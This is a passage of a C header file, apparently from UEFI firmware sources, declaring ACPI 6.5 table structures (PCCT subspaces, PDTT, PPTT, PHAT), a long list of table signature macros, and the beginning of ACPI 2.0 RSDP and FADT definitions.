} EFI_ACPI_6_5_PCCT_SUBSPACE_1_HW_REDUCED_COMMUNICATIONS;

///
/// Type 2 HW-Reduced Communications Subspace Structure
///
typedef struct {
    UINT8                                     Type;
    UINT8                                     Length;
    UINT32                                    PlatformInterrupt;
    UINT8                                     PlatformInterruptFlags;
    UINT8                                     Reserved;
    UINT64                                    BaseAddress;
    UINT64                                    AddressLength;
    EFI_ACPI_6_5_GENERIC_ADDRESS_STRUCTURE    DoorbellRegister;
    UINT64                                    DoorbellPreserve;
    UINT64                                    DoorbellWrite;
    UINT32                                    NominalLatency;
    UINT32                                    MaximumPeriodicAccessRate;
    UINT16                                    MinimumRequestTurnaroundTime;
    EFI_ACPI_6_5_GENERIC_ADDRESS_STRUCTURE    PlatformInterruptAckRegister;
    UINT64                                    PlatformInterruptAckPreserve;
    UINT64                                    PlatformInterruptAckWrite;
} EFI_ACPI_6_5_PCCT_SUBSPACE_2_HW_REDUCED_COMMUNICATIONS;

///
/// Type 3 Extended PCC Subspace Structure
///
typedef struct {
    UINT8                                     Type;
    UINT8                                     Length;
    UINT32                                    PlatformInterrupt;
    UINT8                                     PlatformInterruptFlags;
    UINT8                                     Reserved;
    UINT64                                    BaseAddress;
    UINT32                                    AddressLength;
    EFI_ACPI_6_5_GENERIC_ADDRESS_STRUCTURE    DoorbellRegister;
    UINT64                                    DoorbellPreserve;
    UINT64                                    DoorbellWrite;
    UINT32                                    NominalLatency;
    UINT32                                    MaximumPeriodicAccessRate;
    UINT32                                    MinimumRequestTurnaroundTime;
    EFI_ACPI_6_5_GENERIC_ADDRESS_STRUCTURE    PlatformInterruptAckRegister;
    UINT64                                    PlatformInterruptAckPreserve;
    UINT64                                    PlatformInterruptAckSet;
    UINT8                                     Reserved1[8];
    EFI_ACPI_6_5_GENERIC_ADDRESS_STRUCTURE    CommandCompleteCheckRegister;
    UINT64                                    CommandCompleteCheckMask;
    EFI_ACPI_6_5_GENERIC_ADDRESS_STRUCTURE    CommandCompleteUpdateRegister;
    UINT64                                    CommandCompleteUpdatePreserve;
    UINT64                                    CommandCompleteUpdateSet;
    EFI_ACPI_6_5_GENERIC_ADDRESS_STRUCTURE    ErrorStatusRegister;
    UINT64                                    ErrorStatusMask;
} EFI_ACPI_6_5_PCCT_SUBSPACE_3_EXTENDED_PCC;

///
/// Type 4 Extended PCC Subspace Structure
///
typedef EFI_ACPI_6_5_PCCT_SUBSPACE_3_EXTENDED_PCC EFI_ACPI_6_5_PCCT_SUBSPACE_4_EXTENDED_PCC;

#define EFI_ACPI_6_5_PCCT_MASTER_SLAVE_COMMUNICATIONS_CHANNEL_FLAGS_NOTIFY_ON_COMPLETION  BIT0

typedef struct {
    UINT32    Signature;
    UINT32    Flags;
    UINT32    Length;
    UINT32    Command;
} EFI_ACPI_6_5_PCCT_EXTENDED_PCC_SHARED_MEMORY_REGION_HEADER;

///
/// Type 5 HW Registers based Communications Subspace Structure
///
typedef struct {
    UINT8                                     Type;
    UINT8                                     Length;
    UINT16                                    Version;
    UINT64                                    BaseAddress;
    UINT64                                    SharedMemoryRangeLength;
    EFI_ACPI_6_5_GENERIC_ADDRESS_STRUCTURE    DoorbellRegister;
    UINT64                                    DoorbellPreserve;
    UINT64                                    DoorbellWrite;
    EFI_ACPI_6_5_GENERIC_ADDRESS_STRUCTURE    CommandCompleteCheckRegister;
    UINT64                                    CommandCompleteCheckMask;
    EFI_ACPI_6_5_GENERIC_ADDRESS_STRUCTURE    ErrorStatusRegister;
    UINT64                                    ErrorStatusMask;
    UINT32                                    NominalLatency;
    UINT32                                    MinimumRequestTurnaroundTime;
} EFI_ACPI_6_5_PCCT_SUBSPACE_5_HW_REGISTERS_COMMUNICATIONS;

///
/// Reduced PCC Subspace Shared Memory Region
///
typedef struct {
    UINT32    Signature;
    // UINT8       CommunicationSubspace[];
} EFI_6_5_PCCT_REDUCED_PCC_SUBSPACE_SHARED_MEMORY_REGION;

///
/// Platform Debug Trigger Table (PDTT)
///
typedef struct {
    EFI_ACPI_DESCRIPTION_HEADER    Header;
    UINT8                          TriggerCount;
    UINT8                          Reserved[3];
    UINT32                         TriggerIdentifierArrayOffset;
} EFI_ACPI_6_5_PLATFORM_DEBUG_TRIGGER_TABLE_HEADER;

///
/// PDTT Revision (as defined in ACPI 6.5 spec.)
///
#define EFI_ACPI_6_5_PLATFORM_DEBUG_TRIGGER_TABLE_REVISION  0x00

///
/// PDTT Platform Communication Channel Identifier Structure
///
typedef struct {
    UINT16    SubChannelIdentifer : 8;
    UINT16    Runtime : 1;
    UINT16    WaitForCompletion : 1;
    UINT16    TriggerOrder : 1;
    UINT16    Reserved : 5;
} EFI_ACPI_6_5_PDTT_PCC_IDENTIFIER;

///
/// PCC Commands Codes used by Platform Debug Trigger Table
///
#define EFI_ACPI_6_5_PDTT_PCC_COMMAND_DOORBELL_ONLY    0x00
#define EFI_ACPI_6_5_PDTT_PCC_COMMAND_VENDOR_SPECIFIC  0x01

///
/// PDTT Platform Communication Channel
///
typedef EFI_ACPI_6_5_PCCT_GENERIC_SHARED_MEMORY_REGION_HEADER EFI_ACPI_6_5_PDTT_PCC;

///
/// Processor Properties Topology Table (PPTT)
///
typedef struct {
    EFI_ACPI_DESCRIPTION_HEADER    Header;
} EFI_ACPI_6_5_PROCESSOR_PROPERTIES_TOPOLOGY_TABLE_HEADER;

///
/// PPTT Revision (as defined in ACPI 6.5 spec.)
///
#define EFI_ACPI_6_5_PROCESSOR_PROPERTIES_TOPOLOGY_TABLE_REVISION  0x03

///
/// PPTT types
///
#define EFI_ACPI_6_5_PPTT_TYPE_PROCESSOR  0x00
#define EFI_ACPI_6_5_PPTT_TYPE_CACHE      0x01

///
/// PPTT Structure Header
///
typedef struct {
    UINT8    Type;
    UINT8    Length;
    UINT8    Reserved[2];
} EFI_ACPI_6_5_PPTT_STRUCTURE_HEADER;

///
/// For PPTT struct processor flags
///
#define EFI_ACPI_6_5_PPTT_PACKAGE_NOT_PHYSICAL          0x0
#define EFI_ACPI_6_5_PPTT_PACKAGE_PHYSICAL              0x1
#define EFI_ACPI_6_5_PPTT_PROCESSOR_ID_INVALID          0x0
#define EFI_ACPI_6_5_PPTT_PROCESSOR_ID_VALID            0x1
#define EFI_ACPI_6_5_PPTT_PROCESSOR_IS_NOT_THREAD       0x0
#define EFI_ACPI_6_5_PPTT_PROCESSOR_IS_THREAD           0x1
#define EFI_ACPI_6_5_PPTT_NODE_IS_NOT_LEAF              0x0
#define EFI_ACPI_6_5_PPTT_NODE_IS_LEAF                  0x1
#define EFI_ACPI_6_5_PPTT_IMPLEMENTATION_NOT_IDENTICAL  0x0
#define EFI_ACPI_6_5_PPTT_IMPLEMENTATION_IDENTICAL      0x1

///
/// Processor hierarchy node structure flags
///
typedef struct {
    UINT32    PhysicalPackage : 1;
    UINT32    AcpiProcessorIdValid : 1;
    UINT32    ProcessorIsAThread : 1;
    UINT32    NodeIsALeaf : 1;
    UINT32    IdenticalImplementation : 1;
    UINT32    Reserved : 27;
} EFI_ACPI_6_5_PPTT_STRUCTURE_PROCESSOR_FLAGS;

///
/// Processor hierarchy node structure
///
typedef struct {
    UINT8                                          Type;
    UINT8                                          Length;
    UINT8                                          Reserved[2];
    EFI_ACPI_6_5_PPTT_STRUCTURE_PROCESSOR_FLAGS    Flags;
    UINT32                                         Parent;
    UINT32                                         AcpiProcessorId;
    UINT32                                         NumberOfPrivateResources;
} EFI_ACPI_6_5_PPTT_STRUCTURE_PROCESSOR;

///
/// For PPTT struct cache flags
///
#define EFI_ACPI_6_5_PPTT_CACHE_SIZE_INVALID       0x0
#define EFI_ACPI_6_5_PPTT_CACHE_SIZE_VALID         0x1
#define EFI_ACPI_6_5_PPTT_NUMBER_OF_SETS_INVALID   0x0
#define EFI_ACPI_6_5_PPTT_NUMBER_OF_SETS_VALID     0x1
#define EFI_ACPI_6_5_PPTT_ASSOCIATIVITY_INVALID    0x0
#define EFI_ACPI_6_5_PPTT_ASSOCIATIVITY_VALID      0x1
#define EFI_ACPI_6_5_PPTT_ALLOCATION_TYPE_INVALID  0x0
#define EFI_ACPI_6_5_PPTT_ALLOCATION_TYPE_VALID    0x1
#define EFI_ACPI_6_5_PPTT_CACHE_TYPE_INVALID       0x0
#define EFI_ACPI_6_5_PPTT_CACHE_TYPE_VALID         0x1
#define EFI_ACPI_6_5_PPTT_WRITE_POLICY_INVALID     0x0
#define EFI_ACPI_6_5_PPTT_WRITE_POLICY_VALID       0x1
#define EFI_ACPI_6_5_PPTT_LINE_SIZE_INVALID        0x0
#define EFI_ACPI_6_5_PPTT_LINE_SIZE_VALID          0x1
#define EFI_ACPI_6_5_PPTT_CACHE_ID_INVALID         0x0
#define EFI_ACPI_6_5_PPTT_CACHE_ID_VALID           0x1

///
/// Cache Type Structure flags
///
typedef struct {
    UINT32    SizePropertyValid : 1;
    UINT32    NumberOfSetsValid : 1;
    UINT32    AssociativityValid : 1;
    UINT32    AllocationTypeValid : 1;
    UINT32    CacheTypeValid : 1;
    UINT32    WritePolicyValid : 1;
    UINT32    LineSizeValid : 1;
    UINT32    CacheIdValid : 1;
    UINT32    Reserved : 24;
} EFI_ACPI_6_5_PPTT_STRUCTURE_CACHE_FLAGS;

///
/// For cache attributes
///
#define EFI_ACPI_6_5_CACHE_ATTRIBUTES_ALLOCATION_READ             0x0
#define EFI_ACPI_6_5_CACHE_ATTRIBUTES_ALLOCATION_WRITE            0x1
#define EFI_ACPI_6_5_CACHE_ATTRIBUTES_ALLOCATION_READ_WRITE       0x2
#define EFI_ACPI_6_5_CACHE_ATTRIBUTES_CACHE_TYPE_DATA             0x0
#define EFI_ACPI_6_5_CACHE_ATTRIBUTES_CACHE_TYPE_INSTRUCTION      0x1
#define EFI_ACPI_6_5_CACHE_ATTRIBUTES_CACHE_TYPE_UNIFIED          0x2
#define EFI_ACPI_6_5_CACHE_ATTRIBUTES_WRITE_POLICY_WRITE_BACK     0x0
#define EFI_ACPI_6_5_CACHE_ATTRIBUTES_WRITE_POLICY_WRITE_THROUGH  0x1

///
/// Cache Type Structure cache attributes
///
typedef struct {
    UINT8    AllocationType : 2;
    UINT8    CacheType : 2;
    UINT8    WritePolicy : 1;
    UINT8    Reserved : 3;
} EFI_ACPI_6_5_PPTT_STRUCTURE_CACHE_ATTRIBUTES;

///
/// Cache Type Structure
///
typedef struct {
    UINT8                                           Type;
    UINT8                                           Length;
    UINT8                                           Reserved[2];
    EFI_ACPI_6_5_PPTT_STRUCTURE_CACHE_FLAGS         Flags;
    UINT32                                          NextLevelOfCache;
    UINT32                                          Size;
    UINT32                                          NumberOfSets;
    UINT8                                           Associativity;
    EFI_ACPI_6_5_PPTT_STRUCTURE_CACHE_ATTRIBUTES    Attributes;
    UINT16                                          LineSize;
    UINT32                                          CacheId;
} EFI_ACPI_6_5_PPTT_STRUCTURE_CACHE;

///
/// Platform Health Assessment Table (PHAT) Format
///
typedef struct {
    EFI_ACPI_DESCRIPTION_HEADER    Header;
    // UINT8                         PlatformTelemetryRecords[];
} EFI_ACPI_6_5_PLATFORM_HEALTH_ASSESSMENT_TABLE;

#define EFI_ACPI_6_5_PLATFORM_HEALTH_ASSESSMENT_TABLE_REVISION  0x01

///
/// PHAT Record Format
///
typedef struct {
    UINT16    PlatformHealthAssessmentRecordType;
    UINT16    RecordLength;
    UINT8     Revision;
    // UINT8   Data[];
} EFI_ACPI_6_5_PHAT_RECORD;

///
/// PHAT Record Type Format
///
#define EFI_ACPI_6_5_PHAT_RECORD_TYPE_FIRMWARE_VERSION_DATA_RECORD  0x0000
#define EFI_ACPI_6_5_PHAT_RECORD_TYPE_FIRMWARE_HEALTH_DATA_RECORD   0x0001

///
/// PHAT Version Element
///
typedef struct {
    GUID      ComponentId;
    UINT64    VersionValue;
    UINT32    ProducerId;
} EFI_ACPI_6_5_PHAT_VERSION_ELEMENT;

///
/// PHAT Firmware Version Data Record
///
typedef struct {
    UINT16    PlatformRecordType;
    UINT16    RecordLength;
    UINT8     Revision;
    UINT8     Reserved[3];
    UINT32    RecordCount;
    // UINT8   PhatVersionElement[];
} EFI_ACPI_6_5_PHAT_FIRMWARE_VERISON_DATA_RECORD;

#define EFI_ACPI_6_5_PHAT_FIRMWARE_VERSION_DATA_RECORD_REVISION  0x01

///
/// Firmware Health Data Record Structure
///
typedef struct {
    UINT16    PlatformRecordType;
    UINT16    RecordLength;
    UINT8     Revision;
    UINT16    Reserved;
    UINT8     AmHealthy;
    GUID      DeviceSignature;
    UINT32    DeviceSpecificDataOffset;
    // UINT8   DevicePath[];
    // UINT8   DeviceSpecificData[];
} EFI_ACPI_6_5_PHAT_FIRMWARE_HEALTH_DATA_RECORD_STRUCTURE;

#define EFI_ACPI_6_5_PHAT_FIRMWARE_HEALTH_DATA_RECORD_REVISION  0x01

///
/// Firmware Health Data Record device health state
///
#define EFI_ACPI_6_5_PHAT_FIRMWARE_HEALTH_DATA_RECORD_ERRORS_FOUND     0x00
#define EFI_ACPI_6_5_PHAT_FIRMWARE_HEALTH_DATA_RECORD_NO_ERRORS_FOUND  0x01
#define EFI_ACPI_6_5_PHAT_FIRMWARE_HEALTH_DATA_RECORD_UNKNOWN          0x02
#define EFI_ACPI_6_5_PHAT_FIRMWARE_HEALTH_DATA_RECORD_ADVISORY         0x03

//
// Known table signatures
//

///
/// "RSD PTR " Root System Description Pointer
///
#define EFI_ACPI_6_5_ROOT_SYSTEM_DESCRIPTION_POINTER_SIGNATURE  SIGNATURE_64('R', 'S', 'D', ' ', 'P', 'T', 'R', ' ')

///
/// "APIC" Multiple APIC Description Table
///
#define EFI_ACPI_6_5_MULTIPLE_APIC_DESCRIPTION_TABLE_SIGNATURE  SIGNATURE_32('A', 'P', 'I', 'C')

///
/// "APMT" Arm Performance Monitoring Unit Table
///
#define EFI_ACPI_6_5_ARM_PERFORMANCE_MONITORING_UNIT_TABLE_SIGNATURE  SIGNATURE_32('A', 'P', 'M', 'T')

///
/// "BERT" Boot Error Record Table
///
#define EFI_ACPI_6_5_BOOT_ERROR_RECORD_TABLE_SIGNATURE  SIGNATURE_32('B', 'E', 'R', 'T')

///
/// "BGRT" Boot Graphics Resource Table
///
#define EFI_ACPI_6_5_BOOT_GRAPHICS_RESOURCE_TABLE_SIGNATURE  SIGNATURE_32('B', 'G', 'R', 'T')

///
/// "CDIT" Component Distance Information Table
///
#define EFI_ACPI_6_5_COMPONENT_DISTANCE_INFORMATION_TABLE_SIGNATURE  SIGNATURE_32('C', 'D', 'I', 'T')

///
/// "CPEP" Corrected Platform Error Polling Table
///
#define EFI_ACPI_6_5_CORRECTED_PLATFORM_ERROR_POLLING_TABLE_SIGNATURE  SIGNATURE_32('C', 'P', 'E', 'P')

///
/// "CRAT" Component Resource Attribute Table
///
#define EFI_ACPI_6_5_COMPONENT_RESOURCE_ATTRIBUTE_TABLE_SIGNATURE  SIGNATURE_32('C', 'R', 'A', 'T')

///
/// "DSDT" Differentiated System Description Table
///
#define EFI_ACPI_6_5_DIFFERENTIATED_SYSTEM_DESCRIPTION_TABLE_SIGNATURE  SIGNATURE_32('D', 'S', 'D', 'T')

///
/// "ECDT" Embedded Controller Boot Resources Table
///
#define EFI_ACPI_6_5_EMBEDDED_CONTROLLER_BOOT_RESOURCES_TABLE_SIGNATURE  SIGNATURE_32('E', 'C', 'D', 'T')

///
/// "EINJ" Error Injection Table
///
#define EFI_ACPI_6_5_ERROR_INJECTION_TABLE_SIGNATURE  SIGNATURE_32('E', 'I', 'N', 'J')

///
/// "ERST" Error Record Serialization Table
///
#define EFI_ACPI_6_5_ERROR_RECORD_SERIALIZATION_TABLE_SIGNATURE  SIGNATURE_32('E', 'R', 'S', 'T')

///
/// "FACP" Fixed ACPI Description Table
///
#define EFI_ACPI_6_5_FIXED_ACPI_DESCRIPTION_TABLE_SIGNATURE  SIGNATURE_32('F', 'A', 'C', 'P')

///
/// "FACS" Firmware ACPI Control Structure
///
#define EFI_ACPI_6_5_FIRMWARE_ACPI_CONTROL_STRUCTURE_SIGNATURE  SIGNATURE_32('F', 'A', 'C', 'S')

///
/// "FPDT" Firmware Performance Data Table
///
#define EFI_ACPI_6_5_FIRMWARE_PERFORMANCE_DATA_TABLE_SIGNATURE  SIGNATURE_32('F', 'P', 'D', 'T')

///
/// "GTDT" Generic Timer Description Table
///
#define EFI_ACPI_6_5_GENERIC_TIMER_DESCRIPTION_TABLE_SIGNATURE  SIGNATURE_32('G', 'T', 'D', 'T')

///
/// "HEST" Hardware Error Source Table
///
#define EFI_ACPI_6_5_HARDWARE_ERROR_SOURCE_TABLE_SIGNATURE  SIGNATURE_32('H', 'E', 'S', 'T')

///
/// "HMAT" Heterogeneous Memory Attribute Table
///
#define EFI_ACPI_6_5_HETEROGENEOUS_MEMORY_ATTRIBUTE_TABLE_SIGNATURE  SIGNATURE_32('H', 'M', 'A', 'T')

///
/// "MPST" Memory Power State Table
///
#define EFI_ACPI_6_5_MEMORY_POWER_STATE_TABLE_SIGNATURE  SIGNATURE_32('M', 'P', 'S', 'T')

///
/// "MSCT" Maximum System Characteristics Table
///
#define EFI_ACPI_6_5_MAXIMUM_SYSTEM_CHARACTERISTICS_TABLE_SIGNATURE  SIGNATURE_32('M', 'S', 'C', 'T')

///
/// "NFIT" NVDIMM Firmware Interface Table
///
#define EFI_ACPI_6_5_NVDIMM_FIRMWARE_INTERFACE_TABLE_STRUCTURE_SIGNATURE  SIGNATURE_32('N', 'F', 'I', 'T')

///
/// "PDTT" Platform Debug Trigger Table
///
#define EFI_ACPI_6_5_PLATFORM_DEBUG_TRIGGER_TABLE_STRUCTURE_SIGNATURE  SIGNATURE_32('P', 'D', 'T', 'T')

///
/// "PMTT" Platform Memory Topology Table
///
#define EFI_ACPI_6_5_PLATFORM_MEMORY_TOPOLOGY_TABLE_SIGNATURE  SIGNATURE_32('P', 'M', 'T', 'T')

///
/// "PPTT" Processor Properties Topology Table
///
#define EFI_ACPI_6_5_PROCESSOR_PROPERTIES_TOPOLOGY_TABLE_STRUCTURE_SIGNATURE  SIGNATURE_32('P', 'P', 'T', 'T')

///
/// "PSDT" Persistent System Description Table
///
#define EFI_ACPI_6_5_PERSISTENT_SYSTEM_DESCRIPTION_TABLE_SIGNATURE  SIGNATURE_32('P', 'S', 'D', 'T')

///
/// "RASF" ACPI RAS Feature Table
///
#define EFI_ACPI_6_5_ACPI_RAS_FEATURE_TABLE_SIGNATURE  SIGNATURE_32('R', 'A', 'S', 'F')

///
/// "RSDT" Root System Description Table
///
#define EFI_ACPI_6_5_ROOT_SYSTEM_DESCRIPTION_TABLE_SIGNATURE  SIGNATURE_32('R', 'S', 'D', 'T')

///
/// "SBST" Smart Battery Specification Table
///
#define EFI_ACPI_6_5_SMART_BATTERY_SPECIFICATION_TABLE_SIGNATURE  SIGNATURE_32('S', 'B', 'S', 'T')

///
/// "SDEV" Secure DEVices Table
///
#define EFI_ACPI_6_5_SECURE_DEVICES_TABLE_SIGNATURE  SIGNATURE_32('S', 'D', 'E', 'V')

///
/// "SLIT" System Locality Information Table
///
#define EFI_ACPI_6_5_SYSTEM_LOCALITY_INFORMATION_TABLE_SIGNATURE  SIGNATURE_32('S', 'L', 'I', 'T')

///
/// "SRAT" System Resource Affinity Table
///
#define EFI_ACPI_6_5_SYSTEM_RESOURCE_AFFINITY_TABLE_SIGNATURE  SIGNATURE_32('S', 'R', 'A', 'T')

///
/// "SSDT" Secondary System Description Table
///
#define EFI_ACPI_6_5_SECONDARY_SYSTEM_DESCRIPTION_TABLE_SIGNATURE  SIGNATURE_32('S', 'S', 'D', 'T')

///
/// "XSDT" Extended System Description Table
///
#define EFI_ACPI_6_5_EXTENDED_SYSTEM_DESCRIPTION_TABLE_SIGNATURE  SIGNATURE_32('X', 'S', 'D', 'T')

///
/// "BOOT" MS Simple Boot Spec
///
#define EFI_ACPI_6_5_SIMPLE_BOOT_FLAG_TABLE_SIGNATURE  SIGNATURE_32('B', 'O', 'O', 'T')

///
/// "CSRT" MS Core System Resource Table
///
#define EFI_ACPI_6_5_CORE_SYSTEM_RESOURCE_TABLE_SIGNATURE  SIGNATURE_32('C', 'S', 'R', 'T')

///
/// "DBG2" MS Debug Port 2 Spec
///
#define EFI_ACPI_6_5_DEBUG_PORT_2_TABLE_SIGNATURE  SIGNATURE_32('D', 'B', 'G', '2')

///
/// "DBGP" MS Debug Port Spec
///
#define EFI_ACPI_6_5_DEBUG_PORT_TABLE_SIGNATURE  SIGNATURE_32('D', 'B', 'G', 'P')

///
/// "DMAR" DMA Remapping Table
///
#define EFI_ACPI_6_5_DMA_REMAPPING_TABLE_SIGNATURE  SIGNATURE_32('D', 'M', 'A', 'R')

///
/// "DRTM" Dynamic Root of Trust for Measurement Table
///
#define EFI_ACPI_6_5_DYNAMIC_ROOT_OF_TRUST_FOR_MEASUREMENT_TABLE_SIGNATURE  SIGNATURE_32('D', 'R', 'T', 'M')

///
/// "ETDT" Event Timer Description Table
///
#define EFI_ACPI_6_5_EVENT_TIMER_DESCRIPTION_TABLE_SIGNATURE  SIGNATURE_32('E', 'T', 'D', 'T')

///
/// "HPET" IA-PC High Precision Event Timer Table
///
#define EFI_ACPI_6_5_HIGH_PRECISION_EVENT_TIMER_TABLE_SIGNATURE  SIGNATURE_32('H', 'P', 'E', 'T')

///
/// "iBFT" iSCSI Boot Firmware Table
///
#define EFI_ACPI_6_5_ISCSI_BOOT_FIRMWARE_TABLE_SIGNATURE  SIGNATURE_32('i', 'B', 'F', 'T')

///
/// "IORT" I/O Remapping Table
///
#define EFI_ACPI_6_5_IO_REMAPPING_TABLE_SIGNATURE  SIGNATURE_32('I', 'O', 'R', 'T')

///
/// "IVRS" I/O Virtualization Reporting Structure
///
#define EFI_ACPI_6_5_IO_VIRTUALIZATION_REPORTING_STRUCTURE_SIGNATURE  SIGNATURE_32('I', 'V', 'R', 'S')

///
/// "LPIT" Low Power Idle Table
///
#define EFI_ACPI_6_5_LOW_POWER_IDLE_TABLE_STRUCTURE_SIGNATURE  SIGNATURE_32('L', 'P', 'I', 'T')

///
/// "MCFG" PCI Express Memory Mapped Configuration Space Base Address Description Table
///
#define EFI_ACPI_6_5_PCI_EXPRESS_MEMORY_MAPPED_CONFIGURATION_SPACE_BASE_ADDRESS_DESCRIPTION_TABLE_SIGNATURE  SIGNATURE_32('M', 'C', 'F', 'G')

///
/// "MCHI" Management Controller Host Interface Table
///
#define EFI_ACPI_6_5_MANAGEMENT_CONTROLLER_HOST_INTERFACE_TABLE_SIGNATURE  SIGNATURE_32('M', 'C', 'H', 'I')

///
/// "MSDM" MS Data Management Table
///
#define EFI_ACPI_6_5_DATA_MANAGEMENT_TABLE_SIGNATURE  SIGNATURE_32('M', 'S', 'D', 'M')

///
/// "PCCT" Platform Communications Channel Table
///
#define EFI_ACPI_6_5_PLATFORM_COMMUNICATIONS_CHANNEL_TABLE_SIGNATURE  SIGNATURE_32('P', 'C', 'C', 'T')

///
/// "PHAT" Platform Health Assessment Table
///
#define EFI_ACPI_6_5_PLATFORM_HEALTH_ASSESSMENT_TABLE_SIGNATURE  SIGNATURE_32('P', 'H', 'A', 'T')

///
/// "SDEI" Software Delegated Exceptions Interface Table
///
#define EFI_ACPI_6_5_SOFTWARE_DELEGATED_EXCEPTIONS_INTERFACE_TABLE_SIGNATURE  SIGNATURE_32('S', 'D', 'E', 'I')

///
/// "SLIC" MS Software Licensing Table Specification
///
#define EFI_ACPI_6_5_SOFTWARE_LICENSING_TABLE_SIGNATURE  SIGNATURE_32('S', 'L', 'I', 'C')

///
/// "SPCR" Serial Port Concole Redirection Table
///
#define EFI_ACPI_6_5_SERIAL_PORT_CONSOLE_REDIRECTION_TABLE_SIGNATURE  SIGNATURE_32('S', 'P', 'C', 'R')

///
/// "SPMI" Server Platform Management Interface Table
///
#define EFI_ACPI_6_5_SERVER_PLATFORM_MANAGEMENT_INTERFACE_TABLE_SIGNATURE  SIGNATURE_32('S', 'P', 'M', 'I')

///
/// "STAO" _STA Override Table
///
#define EFI_ACPI_6_5_STA_OVERRIDE_TABLE_SIGNATURE  SIGNATURE_32('S', 'T', 'A', 'O')

///
/// "TCPA" Trusted Computing Platform Alliance Capabilities Table
///
#define EFI_ACPI_6_5_TRUSTED_COMPUTING_PLATFORM_ALLIANCE_CAPABILITIES_TABLE_SIGNATURE  SIGNATURE_32('T', 'C', 'P', 'A')

///
/// "TPM2" Trusted Computing Platform 1 Table
///
#define EFI_ACPI_6_5_TRUSTED_COMPUTING_PLATFORM_2_TABLE_SIGNATURE  SIGNATURE_32('T', 'P', 'M', '2')

///
/// "UEFI" UEFI ACPI Data Table
///
#define EFI_ACPI_6_5_UEFI_ACPI_DATA_TABLE_SIGNATURE  SIGNATURE_32('U', 'E', 'F', 'I')

///
/// "WAET" Windows ACPI Emulated Devices Table
///
#define EFI_ACPI_6_5_WINDOWS_ACPI_EMULATED_DEVICES_TABLE_SIGNATURE  SIGNATURE_32('W', 'A', 'E', 'T')

///
/// "WDAT" Watchdog Action Table
///
#define EFI_ACPI_6_5_WATCHDOG_ACTION_TABLE_SIGNATURE  SIGNATURE_32('W', 'D', 'A', 'T')

///
/// "WDRT" Watchdog Resource Table
///
#define EFI_ACPI_6_5_WATCHDOG_RESOURCE_TABLE_SIGNATURE  SIGNATURE_32('W', 'D', 'R', 'T')

///
/// "WPBT" MS Platform Binary Table
///
#define EFI_ACPI_6_5_PLATFORM_BINARY_TABLE_SIGNATURE  SIGNATURE_32('W', 'P', 'B', 'T')

///
/// "WSMT" Windows SMM Security Mitigation Table
///
#define EFI_ACPI_6_5_WINDOWS_SMM_SECURITY_MITIGATION_TABLE_SIGNATURE  SIGNATURE_32('W', 'S', 'M', 'T')

///
/// "XENV" Xen Project Table
///
#define EFI_ACPI_6_5_XEN_PROJECT_TABLE_SIGNATURE  SIGNATURE_32('X', 'E', 'N', 'V')

#pragma pack()

#pragma pack(1)

///
/// ACPI 2.0 Generic Address Space definition
///
typedef struct {
    UINT8     AddressSpaceId;
    UINT8     RegisterBitWidth;
    UINT8     RegisterBitOffset;
    UINT8     Reserved;
    UINT64    Address;
} EFI_ACPI_2_0_GENERIC_ADDRESS_STRUCTURE;

///
/// Root System Description Pointer Structure
///
typedef struct {
    UINT64    Signature;
    UINT8     Checksum;
    UINT8     OemId[6];
    UINT8     Revision;
    UINT32    RsdtAddress;
    UINT32    Length;
    UINT64    XsdtAddress;
    UINT8     ExtendedChecksum;
    UINT8     Reserved[3];
} EFI_ACPI_2_0_ROOT_SYSTEM_DESCRIPTION_POINTER;

///
/// Common table header, this prefaces all ACPI tables, including FACS, but
/// excluding the RSD PTR structure
///
typedef struct {
    UINT32    Signature;
    UINT32    Length;
} EFI_ACPI_2_0_COMMON_HEADER;

//
// Root System Description Table
// No definition needed as it is a common description table header, the same with
// EFI_ACPI_DESCRIPTION_HEADER, followed by a variable number of UINT32 table pointers.
//

///
/// RSDT Revision (as defined in ACPI 2.0 spec.)
///
#define EFI_ACPI_2_0_ROOT_SYSTEM_DESCRIPTION_TABLE_REVISION  0x01

//
// Extended System Description Table
// No definition needed as it is a common description table header, the same with
// EFI_ACPI_DESCRIPTION_HEADER, followed by a variable number of UINT64 table pointers.
//

///
/// XSDT Revision (as defined in ACPI 2.0 spec.)
///
#define EFI_ACPI_2_0_EXTENDED_SYSTEM_DESCRIPTION_TABLE_REVISION  0x01

///
/// RSD_PTR Revision (as defined in ACPI 2.0 spec.)
///
#define EFI_ACPI_2_0_ROOT_SYSTEM_DESCRIPTION_POINTER_REVISION  0x02

///
/// FADT Version (as defined in ACPI 2.0 spec.)
///
#define EFI_ACPI_2_0_FIXED_ACPI_DESCRIPTION_TABLE_REVISION  0x03

///
/// "DSDT" Differentiated System Description Table
///
#define EFI_ACPI_2_0_DIFFERENTIATED_SYSTEM_DESCRIPTION_TABLE_SIGNATURE  SIGNATURE_32('D', 'S', 'D', 'T')

///
/// "FACP" Fixed ACPI Description Table
///
#define EFI_ACPI_2_0_FIXED_ACPI_DESCRIPTION_TABLE_SIGNATURE  SIGNATURE_32('F', 'A', 'C', 'P')

///
/// "FACS" Firmware ACPI Control Structure
///
#define EFI_ACPI_2_0_FIRMWARE_ACPI_CONTROL_STRUCTURE_SIGNATURE  SIGNATURE_32('F', 'A', 'C', 'S')

///
/// Fixed ACPI Description Table Structure (FADT)
///
typedef struct {
    EFI_ACPI_DESCRIPTION_HEADER               Header;
    UINT32                                    FirmwareCtrl;
    UINT32                                    Dsdt;
    UINT8                                     Reserved0;
    UINT8                                     PreferredPmProfile;
    UINT16                                    SciInt;
    UINT32                                    SmiCmd;
    UINT8                                     AcpiEnable;
    UINT8                                     AcpiDisable;
    UINT8                                     S4BiosReq;
    UINT8                                     PstateCnt;
    UINT32                                    Pm1aEvtBlk;
    UINT32                                    Pm1bEvtBlk;
    UINT32                                    Pm1aCntBlk;
    UINT32                                    Pm1bCntBlk;
    UINT32                                    Pm2CntBlk;
    UINT32                                    PmTmrBlk;
    UINT32                                    Gpe0Blk;
    UINT32                                    Gpe1Blk;
    UINT8                                     Pm1EvtLen;
    UINT8                                     Pm1CntLen;
    UINT8                                     Pm2CntLen;
    UINT8                                     PmTmrLen;
    UINT8                                     Gpe0BlkLen;
    UINT8                                     Gpe1BlkLen;
    UINT8                                     Gpe1Base;
    UINT8                                     CstCnt;
    UINT16                                    PLvl2Lat;
    UINT16                                    PLvl3Lat;
    UINT16                                    FlushSize;
    UINT16                                    FlushStride;
    UINT8                                     DutyOffset;
    UINT8                                     DutyWidth;
    UINT8                                     DayAlrm;
    UINT8                                     MonAlrm;
    UINT8                                     Century;
    UINT16                                    IaPcBootArch;
    UINT8                                     Reserved1;
    UINT32                                    Flags;
